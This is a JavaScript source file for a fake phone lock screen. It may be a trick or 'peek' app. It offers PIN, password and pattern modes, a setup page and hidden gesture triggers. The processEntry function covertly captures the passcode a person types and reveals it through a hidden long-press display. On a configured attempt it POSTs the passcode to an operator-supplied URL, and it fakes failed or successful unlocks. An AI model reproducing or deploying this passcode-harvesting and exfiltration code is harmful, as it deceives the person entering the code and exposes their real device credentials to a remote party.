let attemptCount = 0;
let forceSuccess = false;
let currentInput = "";
let peekData = null;
let lastTap = 0;
let holdTimer;

const config = {
    mode: "pin4",
    successAt: 1,
    peekAt: 1,
    sendAt: 1,
    url: ""
};

/* =========================
   LOAD
========================= */
window.onload = () => {
    updateTime();
    setInterval(updateTime, 10000);

    /* Disable image long-press menu ONLY on carousel images */
    document.querySelectorAll('.slide img').forEach(img => {
        img.addEventListener('contextmenu', e => e.preventDefault());
        img.style.webkitTouchCallout = 'none';
    });
};

/* =========================
   MODE CHIPS
========================= */
document.querySelectorAll('.chip').forEach(chip => {
    chip.addEventListener('click', () => {
        document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        config.mode = chip.dataset.mode;
    });
});

/* =========================
   START APP
========================= */
document.getElementById('start-app').addEventListener('click', () => {
    config.successAt = +document.getElementById('success-try').value;
    config.peekAt = +document.getElementById('peek-try').value;
    config.sendAt = +document.getElementById('send-try').value;
    config.url = document.getElementById('script-url').value;

    document.getElementById('setup-page').classList.add('hidden');
    document.getElementById('lock-page').classList.remove('hidden');

    initLockMode();
});

/* =========================
   MODE VISIBILITY (RESTORED)
========================= */
function hideAllModes() {
    document.getElementById('pin-dots').classList.add('hidden');
    document.getElementById('pin-pad').classList.add('hidden');
    document.getElementById('password-tap-zone').classList.add('hidden');
    document.getElementById('pattern-canvas').classList.add('hidden');
}

function initLockMode() {
    hideAllModes();

    if (config.mode.includes('pin')) {
        const dots = config.mode === 'pin4' ? 4 : 6;
        document.getElementById('pin-dots').innerHTML =
            '<div class="dot"></div>'.repeat(dots);
        document.getElementById('pin-dots').classList.remove('hidden');
        document.getElementById('pin-pad').classList.remove('hidden');
    }
    else if (config.mode === 'password') {
        document.getElementById('password-tap-zone').classList.remove('hidden');
        document.getElementById('hidden-pass-input').focus();
    }
    else {
        const canvas = document.getElementById('pattern-canvas');
        canvas.classList.remove('hidden');
        drawDots();
    }
}

/* =========================
   SECRET PEEK (1s HOLD)
========================= */
['secret-trigger-lock','secret-trigger-home'].forEach(id => {
    const el = document.getElementById(id);
    const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';

    el.addEventListener('contextmenu', e => e.preventDefault());

    el.addEventListener('touchstart', () => {
        holdTimer = setTimeout(() => {
            drawPeek(peekEl);
            document.getElementById(peekEl).classList.remove('hidden');
        }, 1000);
    });

    el.addEventListener('touchend', () => {
        clearTimeout(holdTimer);
        document.getElementById(peekEl).classList.add('hidden');
    });
});

/* =========================
   TRIPLE TAP BACK (FIXED)
========================= */
let tapCount = 0;
let tapTimer;

document.addEventListener('touchend', e => {
    if (e.target.closest('button, input, canvas, .num, .chip')) return;

    tapCount++;
    clearTimeout(tapTimer);
    tapTimer = setTimeout(() => tapCount = 0, 450);

    if (tapCount === 3) {
        tapCount = 0;

        if (!document.getElementById('home-page').classList.contains('hidden')) {
            document.getElementById('home-page').classList.add('hidden');
            document.getElementById('lock-page').classList.remove('hidden');
        }
        else if (!document.getElementById('lock-page').classList.contains('hidden')) {
            document.getElementById('lock-page').classList.add('hidden');
            document.getElementById('setup-page').classList.remove('hidden');
        }
    }
});

/* =========================
   PIN INPUT (UNCHANGED)
========================= */
document.querySelectorAll('.num').forEach(btn => {
    btn.addEventListener('click', () => {
        currentInput += btn.querySelector('span').innerText;
        const dot = document.querySelectorAll('.dot')[currentInput.length - 1];
        if (dot) dot.classList.add('filled');

        const limit = config.mode === 'pin4' ? 4 : 6;
        if (currentInput.length === limit)
            setTimeout(() => processEntry(currentInput), 200);
    });
});

/* =========================
   PATTERN LOGIC (UNCHANGED)
========================= */
const canvas = document.getElementById('pattern-canvas');
const ctx = canvas.getContext('2d');
const dots = [];
let currentPattern = [];

for (let i = 0; i < 3; i++)
for (let j = 0; j < 3; j++)
dots.push({ x: j * 100 + 50, y: i * 100 + 50, id: i * 3 + j });

function drawDots() {
    ctx.clearRect(0, 0, 300, 300);
    ctx.strokeStyle = "white";
    ctx.lineWidth = 4;

    if (currentPattern.length) {
        ctx.beginPath();
        ctx.moveTo(dots[currentPattern[0]].x, dots[currentPattern[0]].y);
        currentPattern.forEach(i => ctx.lineTo(dots[i].x, dots[i].y));
        ctx.stroke();
    }

    dots.forEach(d => {
        ctx.beginPath();
        ctx.arc(d.x, d.y, 10, 0, Math.PI * 2);
        ctx.fillStyle = currentPattern.includes(d.id)
            ? "white"
            : "rgba(255,255,255,0.3)";
        ctx.fill();
    });
}

canvas.addEventListener('touchmove', e => {
    const r = canvas.getBoundingClientRect();
    const x = e.touches[0].clientX - r.left;
    const y = e.touches[0].clientY - r.top;

    dots.forEach(d => {
        if (Math.hypot(x - d.x, y - d.y) < 30 && !currentPattern.includes(d.id)) {
            currentPattern.push(d.id);
            navigator.vibrate(10);
        }
    });
    drawDots();
});

canvas.addEventListener('touchend', () => {
    if (currentPattern.length > 1)
        processEntry(currentPattern.join('-'), true);
    currentPattern = [];
    drawDots();
});

/* =========================
   CORE (UNCHANGED)
========================= */
function processEntry(val, isPattern = false) {
    attemptCount++;

    if (attemptCount === config.peekAt)
        peekData = isPattern ? val.split('-').map(Number) : val;

    if (!isPattern && attemptCount === config.sendAt && config.url)
        fetch(config.url, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ passcode: val })
        });

    if (attemptCount === config.successAt || forceSuccess) {
        document.getElementById('unlock-sound').play();
        document.getElementById('lock-page').classList.add('hidden');
        document.getElementById('home-page').classList.remove('hidden');
    } else {
        document.getElementById('lock-content').classList.add('shake');
        navigator.vibrate([50, 50, 50]);
        setTimeout(() =>
            document.getElementById('lock-content').classList.remove('shake'), 400
        );
        currentInput = "";
        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
        document.getElementById('hidden-pass-input').value = "";
    }
}

/* =========================
   CLOCK
========================= */
function updateTime() {
    const now = new Date();
    document.querySelector('.clock').innerText =
        now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
}
